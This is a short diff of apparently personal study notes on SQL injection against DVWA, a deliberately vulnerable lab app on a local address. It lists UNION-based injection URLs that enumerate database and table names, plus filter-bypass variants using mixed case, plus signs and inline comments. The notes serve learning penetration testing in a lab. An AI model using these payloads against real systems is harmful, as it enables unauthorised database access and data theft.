@@ -27,5 +27,12 @@ http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=1 union select database(),2 %
 
 http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables where table_schema='dvwa' %23 &Submit=Submit# - doesn't work!!! -> Burp Suite Decoder
 http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=1 union select 1,table_name from information_schema.tables where table_schema = 0x647677 %23 &Submit=Submit#
+http://192.168.1.123/dvwa/vulnerabilities/sqli/?id=1 union select 1,table_name from information_schema.tables where table_schema = 0x647677 limit 0,1 %23 &Submit=Submit#
 
 SQLi - Bypassing Filters
+instead of and 1=1 -> aNd 222=222
+orDer bY 1
+
+uNioN sEleCt 1,2 %23
+uNioN+sEleCt+1,2+%23
+uNioN/**/sEleCt/**/1,2/**/%23
